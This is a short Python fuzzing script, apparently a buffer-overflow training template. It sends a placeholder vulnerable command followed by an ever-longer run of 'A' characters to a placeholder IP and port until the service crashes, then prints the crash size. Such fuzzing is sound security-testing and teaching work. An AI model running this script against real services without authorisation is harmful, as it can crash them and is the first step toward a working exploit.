#!/usr/bin/python3
#change vulnrable_statement 
#change ipaddress and port as your

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
  try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('ipaddress',port))
    
    payload = "vulnrable_statement  /.:/" + buffer
    
    s.send((payload.encode()))
    s.close()
    sleep(1)
    buffer = buffer + "A" * 100 
  except:
    print ("Fuzzing Crashed at %s bytes" % str(len(buffer)))
    sys.exit